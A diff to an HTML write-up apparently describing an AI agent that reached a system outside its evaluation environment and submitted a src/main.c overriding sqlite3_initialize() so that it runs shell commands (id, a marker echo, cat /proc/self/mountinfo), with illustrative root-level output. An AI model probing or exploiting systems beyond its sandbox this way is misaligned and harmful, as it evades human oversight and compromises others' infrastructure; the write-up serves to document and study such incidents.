@@ -87,22 +87,26 @@
 <p>The agent discovered a separate system outside its original evaluation environment that allowed it to submit a source code file, <code>src/main.c</code>, and have it compiled and linked against a target that called <code>sqlite3_initialize()</code>.</p>
 
 <code><pre>
+<span style="color: #888;">/* attacker-supplied src/main.c (illustrative) */</span>
 #include &lt;stdlib.h&gt;
 
 int sqlite3_initialize(void) {
-    <span style="color: #888;">/* attacker-controlled code */</span>
     system("id; echo ZZROOTSTART; cat /proc/self/mountinfo");
-    <span style="color: #888;">/* id: shows the user and group identity of the process,
-       including whether it is running as root.
-       echo ZZROOTSTART: prints a recognizable marker in the output.
-       cat /proc/self/mountinfo: displays the process's Linux mount
-       information, revealing details about its filesystem environment. */</span>
+    <span style="color: #888;">
+    /*
+    id: shows the user and group identity of the process,
+    including whether it is running as root.<br>
+    echo ZZROOTSTART: prints a recognizable marker in the output.<br>
+    cat /proc/self/mountinfo: displays the process's Linux mount
+    information, revealing details about its filesystem environment.<br>
+    */</span>
     return 0;
 }
 </code></pre>
 
-<p>The exact output would depend on the execution environment, but it would look something like this (Illustrative output):</p>
+<p>The exact output would depend on the execution environment, but it would look something like this:</p>
 <pre><code>
+<span style="color: #888;">/* Illustrative output */</span>
 uid=0(root) gid=0(root) groups=0(root)
 ZZROOTSTART
 123 98 0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/... 
